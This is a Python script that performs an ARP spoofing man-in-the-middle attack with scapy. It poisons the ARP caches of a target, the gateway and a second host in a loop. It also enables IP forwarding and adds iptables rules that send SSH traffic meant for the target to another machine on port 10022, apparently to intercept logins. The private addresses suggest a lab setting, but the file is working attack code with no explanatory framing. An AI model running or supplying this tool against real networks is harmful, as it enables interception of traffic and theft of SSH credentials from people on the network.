import subprocess
import scapy.all as scapy
from scapy.layers.l2 import Ether, ARP
from scapy.sendrecv import send
import time

def run_command(command):
    """Execute a shell command"""
    process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    stdout, stderr = process.communicate()
    if process.returncode != 0:
        print(f"Error executing command: {command}\n{stderr.decode()}")
    return stdout.decode()

def setup_iptables():
    """Setup iptables rules"""
    run_command("echo 1 > /proc/sys/net/ipv4/ip_forward")
    run_command("iptables -t nat -A PREROUTING -p tcp -d 10.0.0.11 --dport 22 -j DNAT --to-destination 10.0.0.13:10022")
    run_command("iptables -A FORWARD -p tcp -d 10.0.0.13 --dport 10022 -m state --state NEW,ESTABLISHED,RELATED -j ACCEPT")
    run_command("iptables -t nat -A POSTROUTING -j MASQUERADE")

def clear_iptables():
    """Clear iptables rules"""
    run_command("iptables -t nat -D PREROUTING -p tcp -d 10.0.0.11 --dport 22 -j DNAT --to-destination 10.0.0.13:10022")
    run_command("iptables -D FORWARD -p tcp -d 10.0.0.13 --dport 10022 -m state --state NEW,ESTABLISHED,RELATED -j ACCEPT")
    run_command("iptables -t nat -D POSTROUTING -j MASQUERADE")

def get_mac(ip):
    """Get MAC address for a given IP"""
    arp_request = ARP(pdst=ip)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=5, verbose=False)[0]
    
    if answered_list:
        return answered_list[0][1].hwsrc
    else:
        raise Exception(f"No response for ARP request to IP {ip}")

def spoof(target_ip, spoof_ip):
    """Send ARP spoofing packet to target IP"""
    try:
        target_mac = get_mac(target_ip)
        packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
        send(packet, verbose=False)
    except Exception as e:
        print(f"Error in spoofing {target_ip} as {spoof_ip}: {e}")

def restore(destination_ip, source_ip):
    """Restore original ARP table state"""
    try:
        destination_mac = get_mac(destination_ip)
        source_mac = get_mac(source_ip)
        packet = ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
        send(packet, verbose=False, count=4)
    except Exception as e:
        print(f"Error in restoring {destination_ip} to {source_ip}: {e}")

if __name__ == "__main__":
    target_ip = "10.0.0.11"
    gateway_ip = "10.0.0.1"
    bob_ip = "10.0.0.12"

    try:
        # Setup iptables rules
        setup_iptables()

        sent_packets_count = 0
        while True:
            spoof(target_ip, gateway_ip)
            spoof(gateway_ip, target_ip)
            spoof(target_ip, bob_ip)
            spoof(bob_ip, target_ip)
            
            sent_packets_count += 4
            print(f"\r[*] Packets Sent: {sent_packets_count}", end="")
            time.sleep(2)  # Waits for two seconds

    except KeyboardInterrupt:
        print("\nCtrl + C pressed.............Exiting")
    except Exception as e:
        print(f"An error occurred: {e}")
    finally:
        # Clear iptables rules
        clear_iptables()

        restore(gateway_ip, target_ip)
        restore(target_ip, gateway_ip)
        restore(bob_ip, target_ip)
        restore(target_ip, bob_ip)
        print("[+] ARP Spoof Stopped and ARP tables restored")
